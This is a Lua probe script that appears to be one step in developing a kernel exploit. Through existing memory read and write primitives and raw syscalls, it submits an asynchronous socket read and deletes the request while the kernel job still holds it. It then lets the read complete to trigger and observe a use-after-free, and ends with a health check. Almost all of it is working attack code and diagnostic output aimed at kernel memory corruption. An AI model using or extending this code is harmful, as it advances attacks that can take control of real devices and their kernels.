-- CRASH_CLASS: HIGH
-- PROBE 566c: delete an aio request that is still waiting on a socket
--
-- Context: 566b shows a read from /dev/urandom completes during the first poll,
-- so a file-backed request cannot be caught in flight. A socket read has to
-- wait for data, which keeps the object pending across calls. That is the
-- window the 14.20 note describes: delete the object while the kernel job is
-- still holding it, then let the job complete.
--
-- Steps: socketpair, submit a 16-byte read on one end, poll, delete, write to
-- the other end, poll again, check the buffer, then a health cycle.

print("=== PROBE 566c: DELETE A PENDING AIO READ ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function hi_lo(v)
    local h, l = get_hi_lo(v)
    return to_num(h), to_num(l)
end
local Z = uint64(0)
local function sc(n) return make_syscall(n) end
local function wq(addr, value) pcall(function() memory.write_qword(addr, value) end) end
local function wd(addr, value) pcall(function() memory.write_dword(addr, value) end) end
local function A(q)
    local a = to_num(q)
    local hi = math.floor(a / 4294967296)
    local lo = a % 4294967296
    return uint64(string.format("0x%08X%08X", hi, lo))
end
local function rd(addr)
    local ok, v = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(v) end
    return -999
end

local reqs = memory.alloc(0x200)
local data = memory.alloc(0x1000)
local result = memory.alloc(0x200)
local ids = memory.alloc(0x200)
local states = memory.alloc(0x100)
local fds = memory.alloc(0x20)
local msg = memory.alloc(0x20)
for i = 0, 0x7F do wd(data + i * 4, 0xA5A5A5A5) end
for i = 0, 0x1F do wd(result + i * 4, 0) wd(ids + i * 4, 0) wd(states + i * 4, 0) wd(reqs + i * 8, 0) wd(fds + i * 4, 0) wd(msg + i * 4, 0) end

-- [A] socketpair
print("[A] socketpair 135")
local ok, rv = pcall(function() return sc(135)(uint64(1), uint64(1), uint64(0), A(fds), Z, Z) end)
print(string.format("  ret=%s fd0=%d fd1=%d", ok and tostring(sgn(rv)) or "PCALL-FAIL", rd(fds), rd(fds + 4)))
local fd0, fd1 = rd(fds), rd(fds + 4)
if fd0 < 3 or fd1 < 3 then
    print("[A] socketpair did not give two fds; stopping")
    print("=== 566c ABORT ===")
    return
end

-- [B] submit the read
local function fill_req(base, off, len, buf, res, fd)
    wq(base + 0x00, off)
    wq(base + 0x08, len)
    local b = to_num(buf)
    local bh = math.floor(b / 4294967296)
    local bl = b % 4294967296
    wd(base + 0x10, bl) wd(base + 0x14, bh)
    local r0 = to_num(res)
    local rh = math.floor(r0 / 4294967296)
    local rl = r0 % 4294967296
    wd(base + 0x18, rl) wd(base + 0x1C, rh)
    wd(base + 0x20, fd)
    wd(base + 0x24, 0)
end
print("[B] create read on fd0")
fill_req(reqs, 0, 16, data, result, fd0)
print(string.format("  669 ret=%s id=0x%X", tostring(sgn(sc(669)(uint64(1), A(reqs), uint64(1), uint64(1), A(ids)))), rd(ids)))
local id = rd(ids)

-- [C] poll: expect pending
for k = 1, 2 do
    print(string.format("[C%d] poll ret=%s state=0x%X res=0x%X", k,
        tostring(sgn(sc(664)(A(ids), uint64(1), A(states)))), rd(states), rd(result)))
end

-- [D] delete while pending
print("[D] delete while pending")
print(string.format("  662 ret=%s status=0x%X", tostring(sgn(sc(662)(A(ids), uint64(1), A(states)))), rd(states)))
print(string.format("  data=%08X %08X %08X %08X", rd(data), rd(data + 4), rd(data + 8), rd(data + 12)))

-- [E] let the read complete
print("[E] write to fd1")
wd(msg, 0x41414141)
wd(msg + 4, 0x42424242)
print(string.format("  write ret=%s", tostring(sgn(sc(4)(uint64(fd1), A(msg), uint64(8), Z, Z, Z)))))

-- [F] observe
for k = 1, 3 do
    print(string.format("[F%d] data=%08X %08X %08X %08X res=0x%X", k,
        rd(data), rd(data + 4), rd(data + 8), rd(data + 12), rd(result)))
    print(string.format("     poll ret=%s state=0x%X", tostring(sgn(sc(664)(A(ids), uint64(1), A(states)))), rd(states)))
end

-- [G] health: one fresh cycle
print("[G] health")
wd(ids, 0) wd(states, 0) wd(result, 0)
for i = 0, 0x7F do wd(data + i * 4, 0xA5A5A5A5) end
fill_req(reqs, 0, 16, data, result, fd0)
print(string.format("  669 ret=%s id=0x%X", tostring(sgn(sc(669)(uint64(1), A(reqs), uint64(1), uint64(1), A(ids)))), rd(ids)))
print(string.format("  664 ret=%s state=0x%X", tostring(sgn(sc(664)(A(ids), uint64(1), A(states)))), rd(states)))
print(string.format("  662 ret=%s status=0x%X", tostring(sgn(sc(662)(A(ids), uint64(1), A(states)))), rd(states)))

print("=== 566c DONE ===")
